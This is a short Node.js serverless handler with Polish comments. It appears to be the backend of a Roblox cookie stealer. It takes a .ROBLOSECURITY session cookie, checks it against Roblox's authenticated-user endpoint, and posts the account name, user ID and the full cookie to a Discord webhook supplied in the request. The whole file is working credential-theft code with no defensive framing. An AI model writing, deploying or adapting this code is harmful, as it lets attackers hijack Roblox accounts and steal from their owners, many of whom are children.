const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { cookie, webhookUrl } = req.body;

    try {
        // 1. Sprawdzanie danych na Roblox
        const robloxRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });

        const { id, name } = robloxRes.data;

        // 2. Wysyłka na Discord Webhook
        await axios.post(webhookUrl, {
            embeds: [{
                title: "🔔 Powiadomienie o koncie",
                fields: [
                    { name: "Nazwa użytkownika", value: name, inline: true },
                    { name: "User ID", value: id.toString(), inline: true },
                    { name: "Cookie", value: `\`\`\`${cookie}\`\`\`` }
                ],
                color: 0x00ff00
            }]
        });

        return res.status(200).json({ success: true, user: name });
    } catch (error) {
        return res.status(400).json({ success: false, message: "Błąd sesji (prawdopodobnie IP-Lock)" });
    }
}
